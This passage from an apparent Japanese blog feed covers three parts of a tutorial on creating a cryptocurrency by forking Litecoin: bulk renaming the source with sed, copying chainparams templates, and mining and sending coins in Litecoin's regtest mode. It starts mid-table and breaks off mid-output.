&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Litecoin&lt;/th&gt;
&lt;th&gt;Raccoin&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Mainnet&lt;/td&gt;
&lt;td&gt;9332/tcp&lt;/td&gt;
&lt;td&gt;8882/tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Testnet&lt;/td&gt;
&lt;td&gt;19332/tcp&lt;/td&gt;
&lt;td&gt;19880/tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Regtest&lt;/td&gt;
&lt;td&gt;19443/tcp&lt;/td&gt;
&lt;td&gt;20887/tcp&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h1 id=&#34;文字列置換&#34;&gt;文字列置換&lt;/h1&gt;
&lt;p&gt;実際にソースコードを修正していきます。
git cloneを使ってLitecoinをクローンしたため、単純にgrepを用いたファイル検索・置換を行うと.gitディレクトリ内の書き換えも発生してしまいます。
これを防ぐため、基本的にgitのls-filesサブコマンドを用いて置換を行っていきます。&lt;/p&gt;
&lt;h2 id=&#34;正式名称の書き換え&#34;&gt;正式名称の書き換え&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/Litecoin/Raccoin/g&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;大文字略称の書き換え&#34;&gt;大文字略称の書き換え&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/LITECOIN/RACCOIN/g&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;小文字略称の書き換え&#34;&gt;小文字略称の書き換え&lt;/h2&gt;
&lt;p&gt;gitコマンドではなく、ファイルを指定して置換を行います。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat &amp;lt;&amp;lt;EOF|tr -d &amp;#39;&amp;#39;|tr &amp;#39;\n&amp;#39; &amp;#39;\0&amp;#39;| xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/ltc/xri/g&amp;#39;
./contrib/gitian-build.sh
./doc/release-process.md
./src/chainparams.cpp
./test/functional/test_framework/address.py
./test/functional/wallet_bumpfee.py
EOF
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h3 id=&#34;コラム小文字略称の罠&#34;&gt;コラム:小文字略称の罠&lt;/h3&gt;
&lt;p&gt;小文字略称で単純な文字列検索・置換をすると意図しない置換が行われます。
具体的には下記ファイルで意図しない置換が行われることを確認しました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./contrib/gitian-keys/petertodd-key.pgp
./src/leveldb/build_detect_platform
./src/test/data/base58_keys_valid.json
./test/util/data/txcreatemultisig3.json
./test/util/data/txcreateoutpubkey2.json
./test/util/data/txcreateoutpubkey2.json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;petertodd-key.pgpファイルに至っては大変な置換が起きます・・・。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-emJqiaQez9pd/5BYtOSG8vLZpAxXfnOgDH/YK6u9WdoX7/RgTAltcoGazmyJHZHj 
+emJqiaQez9pd/5BYtOSG8vLZpAxXfnOgDH/YK6u9WdoX7/RgTAxrioGazmyJHZHj
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;通貨単位の書き換え&#34;&gt;通貨単位の書き換え&lt;/h2&gt;
&lt;p&gt;Litecoinの基本通貨単位「LTC」に関しては単純な文字列置換で既に XRI に変更していますが、小数点以下の通貨も名称がつけられているので変更します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sed -i &amp;#39;&amp;#39; -e &amp;#39;s/lites/mXRI/g&amp;#39; ./src/qt/bitcoinunits.cpp
$ sed -i &amp;#39;&amp;#39; -e &amp;#39;s/Lites/mXRI/g&amp;#39; ./src/qt/bitcoinunits.cpp
$ sed -i &amp;#39;&amp;#39; -e &amp;#39;s/photons/uXRI/g&amp;#39; ./src/qt/bitcoinunits.cpp
$ sed -i &amp;#39;&amp;#39; -e &amp;#39;s/Photons/uXRI/g&amp;#39; ./src/qt/bitcoinunits.cpp
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ポート番号の書き換え&#34;&gt;ポート番号の書き換え&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git ls-files | grep -v &amp;#34;doc/release-notes/release-notes-0.15.0.md&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;\0&amp;#39;| xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/9333/8883/g&amp;#39;
$ git ls-files | grep -v &amp;#34;src/qt/res/src/network_disabled.svg&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;\0&amp;#39; | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/19335/19883/g&amp;#39;
$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/19444/20888/g&amp;#39;

$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/9332/8882/g&amp;#39;
$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/19332/19880/g&amp;#39;
$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/19443/20887/g&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;「9333」と「19335」は 特定のファイルで意図しない部分で偶然一致してしまうので、該当ファイルを除外して置き換えています。&lt;/p&gt;
&lt;h2 id=&#34;ファイル名の変更&#34;&gt;ファイル名の変更&lt;/h2&gt;
&lt;p&gt;litecoin がファイル名に含まれるものは、manのファイル名とGUIの起動時のスプラッシュ画像です。
renameコマンドはOSやバージョンによって全く挙動が異なるため、念のためmvコマンドで変更します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cd ./doc/man/
$ mv litecoin-cli.1 raccoin-cli.1
$ mv litecoin-qt.1 raccoin-qt.1
$ mv litecoin-tx.1 raccoin-tx.1
$ mv litecoind.1 raccoind.1
$ cd ../../
$ mv ./src/qt/res/icons/litecoin_splash.png ./src/qt/res/icons/raccoin_splash.png
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;誤った名称変更の再修正&#34;&gt;誤った名称変更の再修正&lt;/h2&gt;
&lt;p&gt;単純な文字列置換では本来変更すべきではない箇所まで変更してしまいます。
例として、下記のようなLitecoinの開発チームが開設したコミュニティやサービスがあります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;litecoin.org&lt;br&gt;
ブランドサイト&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://www.litecoinpool.org&#34;&gt;www.litecoinpool.org&lt;/a&gt;&lt;br&gt;
採掘プール&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;litecoin.info&lt;br&gt;
Wiki&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://travis-ci.org/litecoin-project/&#34;&gt;https://travis-ci.org/litecoin-project/&lt;/a&gt;&lt;br&gt;
ソースコードのテストサービス&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/litecoin-project/&#34;&gt;https://github.com/litecoin-project/&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;mailto:git@github.com&#34;&gt;git@github.com&lt;/a&gt;:litecoin-project/litecoin.git&lt;br&gt;
Litecoinのgithub&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://groups.google.com/forum/#!forum/litecoin-dev&#34;&gt;https://groups.google.com/forum/#!forum/litecoin-dev&lt;/a&gt;&lt;br&gt;
Googleグループ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://webchat.freenode.net?channels=litecoin&#34;&gt;http://webchat.freenode.net?channels=litecoin&lt;/a&gt;&lt;br&gt;
IRCチャンネル&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/pooler/litecoin-seeder&#34;&gt;https://github.com/pooler/litecoin-seeder&lt;/a&gt;&lt;br&gt;
DNSSeed のリスト&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;また、以下の著作権表示も該当します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Copyright (C) 2011-2018 The Litecoin Core developers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これらのうち、コミュニティやサービスがリンク切れを起こすものに関しては大きな問題にはならないこと、またこの段階で様々なコミュニティを開設するのは自作仮想通貨を作るうえでは完全に蛇足であることから、ここでの修正はしません。
ただし、著作権表示については誤った表示のままだとソースコードのパクリと勘違いされるため、正しい記載に修正する必要があります。
以下のコマンドを実行し、著作権表示を修正します。&lt;/p&gt;
&lt;h3 id=&#34;著作権表示の修正&#34;&gt;著作権表示の修正&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git ls-files -z | xargs -0 sed -i &amp;#39;&amp;#39; -e &amp;#39;s/The Raccoin Core developers/The Litecoin Core developers/g&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;p&gt;ここまででソースコードの単純な置換は終了です。&lt;/p&gt;
&lt;p&gt;次の章からは置換だけでは終わらない、ビットコインのよりディープな部分を解説しながら変更していきます。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(5) - 単純な文字列置換</title>
        <link>https://www.shutingrz.com/post/oreore-coin5/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(4) - テンプレートファイルのコピー</title>
      <link>https://www.shutingrz.com/post/oreore-coin4/</link>
      <pubDate>Sun, 28 Apr 2019 22:45:13 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin4/</guid>
      <description>&lt;p&gt;チェックポイントなどの確認処理を全て消したテンプレートファイルをコピーし新しい仮想通貨に合わせて色々な設定をしていきます。&lt;/p&gt;
&lt;h2 id=&#34;chainparamscpp--chainparamsh-の置き換え&#34;&gt;chainparams.cpp / chainparams.h の置き換え&lt;/h2&gt;
&lt;p&gt;BitcoinやLitecoinなど既に流通済みの仮想通貨は、その仮想通貨が流通済みの仮想通貨の仕様と合致しているかを確認するため、様々なチェックを行います。
例えばジェネシスブロックのハッシュがこの値と一致しているかだとか、その通貨の1000番目のブロックがこの値と一致しているか、などです。&lt;/p&gt;
&lt;p&gt;これらのいわば鶏卵問題のようなチェックは既に流通済みのものを対象にしているため、今回のように全く新しい仮想通貨を作る際には全て不要であるばかりか、存在していると実行時にエラーで止まってしまいます。&lt;/p&gt;
&lt;p&gt;そのため、これらの不要な記載を全て削除したテンプレートファイルを用意しました。
下記のGithubからtmpl_chainparams.cpp、tmpl_chainparamsseeds.hをダウンロードし、srcディレクトリにコピーしてください。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/shutingrz/oreore_cryptocurrency_template&#34;&gt;https://github.com/shutingrz/oreore_cryptocurrency_template&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;ファイルのコピー&#34;&gt;ファイルのコピー&lt;/h2&gt;
&lt;p&gt;コピー先のディレクトリ名(raccoin等)は自分のディレクトリ名に置き換えてください。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cp tmpl_chainparams.cpp raccoin/src/chainparams.cpp
$ cp tmpl_chainparamsseeds.h raccoin/src/chainparamsseeds.h
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これでテンプレートのコピーは完了です。&lt;br&gt;
次の章からはいよいよソースコードの修正に入ります。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>自作仮想通貨入門(4) - テンプレートファイルのコピー</title>
        <link>https://www.shutingrz.com/post/oreore-coin4/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>自作仮想通貨入門(3) - Litecoinを試してみよう</title>
      <link>https://www.shutingrz.com/post/oreore-coin3/</link>
      <pubDate>Sun, 28 Apr 2019 22:05:53 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/oreore-coin3/</guid>
      <description>&lt;p&gt;自作仮想通貨を作る前に、もととなるLitecoinでマイニングや送金を試してみます。&lt;br&gt;
既にコマンドラインでマイニングや送金を行ったことがあるかたは、読み飛ばしてもかまいません。&lt;/p&gt;
&lt;p&gt;なお、前の項目でLitecoinをコンパイルしましたが、Litecoinはテスト用に起動するだけなので、&lt;br&gt;
システムへのインストール(make install)は行いません。&lt;/p&gt;
&lt;h3 id=&#34;注意事項&#34;&gt;注意事項&lt;/h3&gt;
&lt;p&gt;このページにはアドレス・トランザクション・ブロックの様々な値が記載されています。
これらの値はランダムに生成されるものなので、例と別の値が出てきても慌てず、うまく読み替えてください。&lt;/p&gt;
&lt;h1 id=&#34;litecoindの起動&#34;&gt;litecoindの起動&lt;/h1&gt;
&lt;p&gt;以下のコマンドを入力し、regtestモードでLitecoinを起動します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoind -regtest -daemon
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ここからlitecoin-cliを使ってlitecoindを操作していきます。&lt;/p&gt;
&lt;h1 id=&#34;残高の確認&#34;&gt;残高の確認&lt;/h1&gt;
&lt;p&gt;getbalanceサブコマンドを使うことで、ウォレットの残高を確認できます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest getbalance
0.00000000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何もしていないので当然0です。&lt;/p&gt;
&lt;h1 id=&#34;ブロックチェーンの確認&#34;&gt;ブロックチェーンの確認&lt;/h1&gt;
&lt;p&gt;初期状態のブロックチェーンを確認してみましょう。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; $ src/litecoin-cli -regtest getblockchaininfo
{
  &amp;#34;chain&amp;#34;: &amp;#34;regtest&amp;#34;,
  &amp;#34;blocks&amp;#34;: 0,
  &amp;#34;headers&amp;#34;: 0,
  &amp;#34;bestblockhash&amp;#34;: &amp;#34;530827f38f93b43ed12af0b3ad25a288dc02ed74d6d7857862df51fc56c416f9&amp;#34;,
  &amp;#34;difficulty&amp;#34;: 4.656542373906925e-10,
  &amp;#34;mediantime&amp;#34;: 1296688602,
  &amp;#34;verificationprogress&amp;#34;: 1,
  &amp;#34;initialblockdownload&amp;#34;: true,
  &amp;#34;chainwork&amp;#34;: &amp;#34;0000000000000000000000000000000000000000000000000000000000000002&amp;#34;,
  &amp;#34;size_on_disk&amp;#34;: 288,
(snip)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;blocksが0となっている通り、ジェネシスブロックだけが存在する状態です。&lt;/p&gt;
&lt;h1 id=&#34;1回だけマイニングしてみる&#34;&gt;1回だけマイニングしてみる&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest generate 1
[
  &amp;#34;893d4887d2f1b2dd57783b82f0e57b33f4ff2c9d49d0039a2245438fa116ee51&amp;#34;
]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1回のマイニングで報酬の50コインがもらえるか、実際に確かめてみましょう。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest getbalance
0.00000000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;増えていません。&lt;br&gt;
なぜならマイニング報酬は後ろに100ブロックチェーンが続かないと使えないようになっているからです。&lt;/p&gt;
&lt;h1 id=&#34;100回マイニングしてみる&#34;&gt;100回マイニングしてみる&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest generate 100
[
  &amp;#34;126bb2b2dfb352831ba4ec6845ed2b3b24bedd51b816c8ee13676a65c3c25031&amp;#34;,
  &amp;#34;3b65d2972b766a24df55ccfec5a22b3170bfb08724af07c22999ae3748dc51c7&amp;#34;,
(略)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ここでブロックチェーンの長さを確認します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest getblockchaininfo

  &amp;#34;headers&amp;#34;: 101,
  &amp;#34;bestblockhash&amp;#34;: &amp;#34;6c1f80ff50dad8342698831e0d3ccb22f2e746801f399b40a1d99a4004c719e7&amp;#34;,
  &amp;#34;difficulty&amp;#34;: 4.656542373906925e-10,
(略)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;長さは101になっていますね。&lt;br&gt;
残高を確認してみましょう。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest getbalance
50.00000000
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;おめでとうございます！無事に残高が50コインになっています。
2018/08/19現在、1ビットコインは日本円で約70万円なので、もしこれがビットコインだったなら3500万円を手に入れたことになります。&lt;/p&gt;
&lt;h1 id=&#34;送金してみる&#34;&gt;送金してみる&lt;/h1&gt;
&lt;h2 id=&#34;受け取り先アドレスの作成&#34;&gt;受け取り先アドレスの作成&lt;/h2&gt;
&lt;p&gt;「tanaka」という名称を付けてアドレスを作成します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest getnewaddress tanaka
QjokZsocrpSUK1rfwaok6rnN6kvTN2eksc
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;tanakaというアカウントで、アドレス「QjokZsocrpSUK1rfwaok6rnN6kvTN2eksc」が作成されました。
この時点でのアカウントごとの残高を確認します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest listaccounts
{
  &amp;#34;&amp;#34;: 50.00000000,
  &amp;#34;tanaka&amp;#34;: 0.00000000
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;既存のデフォルトアカウントに50コイン、takanaアカウントに0コインの残高があることがわかります。&lt;/p&gt;
&lt;h2 id=&#34;tanakaに送金してみる&#34;&gt;tanakaに送金してみる&lt;/h2&gt;
&lt;p&gt;デフォルトアカウントからtanakaに20コイン送金してみます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest sendtoaddress QjokZsocrpSUK1rfwaok6rnN6kvTN2eksc 20
c80b9c9de0bb4a85a02bf95ecf8d71189c9d38e5b473a21067302d67e131e590
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;トランザクション「c80b9c・・・」が作成されました。&lt;/p&gt;
&lt;p&gt;この状態で改めて残高を確認します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest listaccounts
{
  &amp;#34;&amp;#34;: 29.99624000,
  &amp;#34;tanaka&amp;#34;: 0.00000000
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;デフォルトアカウントの残高が減って、tanakaは何も増えていません。&lt;br&gt;
また、ウォレットが使える取引情報(UTXO)を確認してみます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest listunspent
[
]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;何もありません。&lt;br&gt;
これはトランザクションが発行されただけで、ブロックに記録されていないからです。&lt;br&gt;
未確定のトランザクションを確認するためには、 listunspent 0 を指定します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; $ src/litecoin-cli -regtest listunspent 0
[
  {
    &amp;#34;txid&amp;#34;: &amp;#34;c80b9c9de0bb4a85a02bf95ecf8d71189c9d38e5b473a21067302d67e131e590&amp;#34;,
    &amp;#34;vout&amp;#34;: 0,
    &amp;#34;address&amp;#34;: &amp;#34;QjokZsocrpSUK1rfwaok6rnN6kvTN2eksc&amp;#34;,
    &amp;#34;account&amp;#34;: &amp;#34;tanaka&amp;#34;,
    &amp;#34;redeemScript&amp;#34;: &amp;#34;0014050bc9402e7b0ab96c52dc9d585e21b3c54fb2db&amp;#34;,
    &amp;#34;scriptPubKey&amp;#34;: &amp;#34;a914fe84949a0a2e0d7a113be0a3e6477181eee7f56c87&amp;#34;,
    &amp;#34;amount&amp;#34;: 20.00000000,
    &amp;#34;confirmations&amp;#34;: 0,
    &amp;#34;spendable&amp;#34;: true,
    &amp;#34;solvable&amp;#34;: true,
    &amp;#34;safe&amp;#34;: true
  },
  {
    &amp;#34;txid&amp;#34;: &amp;#34;c80b9c9de0bb4a85a02bf95ecf8d71189c9d38e5b473a21067302d67e131e590&amp;#34;,
    &amp;#34;vout&amp;#34;: 1,
    &amp;#34;address&amp;#34;: &amp;#34;QNa7cd7mmjsxt5ndqwVskRPzDVKMRyiBPa&amp;#34;,
    &amp;#34;redeemScript&amp;#34;: &amp;#34;0014654c30cd52f71d9d6ac0211983a2286be25c5a06&amp;#34;,
    &amp;#34;scriptPubKey&amp;#34;: &amp;#34;a9141595af5c3857e5b202227c74f61bf0a98f0f893b87&amp;#34;,
    &amp;#34;amount&amp;#34;: 29.99624000,
    &amp;#34;confirmations&amp;#34;: 0,
    &amp;#34;spendable&amp;#34;: true,
    &amp;#34;solvable&amp;#34;: true,
    &amp;#34;safe&amp;#34;: true
  }
]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;未確定のトランザクションには確かに送金情報が記載されています。&lt;/p&gt;
&lt;h1 id=&#34;マイニングを行いトランザクションを確定させる&#34;&gt;マイニングを行いトランザクションを確定させる&lt;/h1&gt;
&lt;p&gt;マイニングを行い、tanakaへ送金したトランザクションをブロックに記録させます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest generate 1
[
  &amp;#34;05434d002c7ae729fa2e581997686c590a5f9fed2a374371f195c6654b833d3b&amp;#34;
]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ここで改めて残高とUTXOを確認します。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;残高の確認&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest listaccounts
{
  &amp;#34;&amp;#34;: 79.99624000,
  &amp;#34;tanaka&amp;#34;: 20.00000000
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;デフォルトアカウントに2ブロック目のマイニングで得た報酬の50コインが、tanakaには先ほどの送金分である20コインが足されています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UTXO の確認&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest listunspent
[
  {
    &amp;#34;txid&amp;#34;: &amp;#34;c80b9c9de0bb4a85a02bf95ecf8d71189c9d38e5b473a21067302d67e131e590&amp;#34;,
    &amp;#34;vout&amp;#34;: 0,
    &amp;#34;address&amp;#34;: &amp;#34;QjokZsocrpSUK1rfwaok6rnN6kvTN2eksc&amp;#34;,
    &amp;#34;account&amp;#34;: &amp;#34;tanaka&amp;#34;,
    &amp;#34;redeemScript&amp;#34;: &amp;#34;0014050bc9402e7b0ab96c52dc9d585e21b3c54fb2db&amp;#34;,
    &amp;#34;scriptPubKey&amp;#34;: &amp;#34;a914fe84949a0a2e0d7a113be0a3e6477181eee7f56c87&amp;#34;,
    &amp;#34;amount&amp;#34;: 20.00000000,
    &amp;#34;confirmations&amp;#34;: 1,
    &amp;#34;spendable&amp;#34;: true,
    &amp;#34;solvable&amp;#34;: true,
    &amp;#34;safe&amp;#34;: true
  },
  {
    &amp;#34;txid&amp;#34;: &amp;#34;c80b9c9de0bb4a85a02bf95ecf8d71189c9d38e5b473a21067302d67e131e590&amp;#34;,
    &amp;#34;vout&amp;#34;: 1,
    &amp;#34;address&amp;#34;: &amp;#34;QNa7cd7mmjsxt5ndqwVskRPzDVKMRyiBPa&amp;#34;,
    &amp;#34;redeemScript&amp;#34;: &amp;#34;0014654c30cd52f71d9d6ac0211983a2286be25c5a06&amp;#34;,
    &amp;#34;scriptPubKey&amp;#34;: &amp;#34;a9141595af5c3857e5b202227c74f61bf0a98f0f893b87&amp;#34;,
    &amp;#34;amount&amp;#34;: 29.99624000,
    &amp;#34;confirmations&amp;#34;: 1,
    &amp;#34;spendable&amp;#34;: true,
    &amp;#34;solvable&amp;#34;: true,
    &amp;#34;safe&amp;#34;: true
  },
  {
    &amp;#34;txid&amp;#34;: &amp;#34;960cd64e6bb01aa669540a58dabe17e2db631e428fdb9c0f63066975b658fca8&amp;#34;,
    &amp;#34;vout&amp;#34;: 0,
    &amp;#34;address&amp;#34;: &amp;#34;mvWofpVPymfSrHuBEegAMz6QJt2X4Lzqtk&amp;#34;,
    &amp;#34;scriptPubKey&amp;#34;: &amp;#34;2103a82d430bfe97d5d0755ab93c93b6c628c9342ccd4ae250311061e0467793753eac&amp;#34;,
    &amp;#34;amount&amp;#34;: 50.00000000,
    &amp;#34;confirmations&amp;#34;: 101,
    &amp;#34;spendable&amp;#34;: true,
    &amp;#34;solvable&amp;#34;: true,
    &amp;#34;safe&amp;#34;: true
  }
]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;UTXOには以下の情報が含まれています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;デフォルトアカウントからtanakaに送金した20コイン&lt;/li&gt;
&lt;li&gt;おつりの29.99624000コイン&lt;/li&gt;
&lt;li&gt;マイニング報酬の50コイン&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;なお送金を行ったトランザクションのインプットで50コイン分のUTXOを使用していますが、使用したのは49.99624コインです。&lt;br&gt;
残っている0.00376コインは暗黙的に手数料を示していて、マイナーが作成したCoinBaseトランザクションに合算されます。&lt;/p&gt;
&lt;p&gt;ここで一応ブロックを見てみましょう。&lt;br&gt;
先ほどのgenerateの返り値のブロックハッシュを指定します。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest getblock 05434d002c7ae729fa2e581997686c590a5f9fed2a374371f195c6654b833d3b
{
  &amp;#34;hash&amp;#34;: &amp;#34;05434d002c7ae729fa2e581997686c590a5f9fed2a374371f195c6654b833d3b&amp;#34;,
  &amp;#34;confirmations&amp;#34;: 1,
  &amp;#34;strippedsize&amp;#34;: 415,
  &amp;#34;size&amp;#34;: 451,
  &amp;#34;weight&amp;#34;: 1696,
  &amp;#34;height&amp;#34;: 102,
  &amp;#34;version&amp;#34;: 536870912,
  &amp;#34;versionHex&amp;#34;: &amp;#34;20000000&amp;#34;,
  &amp;#34;merkleroot&amp;#34;: &amp;#34;8a3f6d02fe2cb106c6bd1b47ac09dbb1ef7f68675003f1c3ec24a09ec0f6d9ed&amp;#34;,
  &amp;#34;tx&amp;#34;: [
    &amp;#34;3a9b412663b6d5d373e0939b0f93cfce070383630a522fa6c9abd44faf64260c&amp;#34;,
    &amp;#34;c80b9c9de0bb4a85a02bf95ecf8d71189c9d38e5b473a21067302d67e131e590&amp;#34;
  ],
  &amp;#34;time&amp;#34;: 1531800402,
  &amp;#34;mediantime&amp;#34;: 1531799237,
  &amp;#34;nonce&amp;#34;: 4,
  &amp;#34;bits&amp;#34;: &amp;#34;207fffff&amp;#34;,
  &amp;#34;difficulty&amp;#34;: 4.656542373906925e-10,
  &amp;#34;chainwork&amp;#34;: &amp;#34;00000000000000000000000000000000000000000000000000000000000000ce&amp;#34;,
  &amp;#34;previousblockhash&amp;#34;: &amp;#34;6c1f80ff50dad8342698831e0d3ccb22f2e746801f399b40a1d99a4004c719e7&amp;#34;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;txパラメータに、tanakaへの送金トランザクション「c80b9c・・・」と、マイニング報酬を示すCoinBaseのトランザクション「3a9b41・・・」が含まれています。&lt;/p&gt;
&lt;p&gt;最後に CoinBaseトランザクションを見てみましょう。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ src/litecoin-cli -regtest gettransaction 3a9b412663b6d5d373e0939b0f93cfce070383630a522fa6c9abd44faf64260c
{
  &amp;#34;amount&amp;#34;: 0.00000000,
  &amp;#34;confirmations&amp;#34;: 1,
  &amp;#34;generated&amp;#34;: true,
  &amp;#34;blockhash&amp;#34;: &amp;#34;05434d002c7ae729fa2e581997686c590a5f9fed2a374371f195c6654b833d3b&amp;#34;,
  &amp;#34;blockindex&amp;#34;: 0,
  &amp;#34;blocktime&amp;#34;: 1531800402,
  &amp;#34;txid&amp;#34;: &amp;#34;3a9b412663b6d5d373e0939b0f93cfce070383630a522fa6c9abd44faf64260c&amp;#34;,
  &amp;#34;walletconflicts&amp;#34;: [
  ],
  &amp;#34;time&amp;#34;: 1531800402,
  &amp;#34;timereceived&amp;#34;: 1531800402,
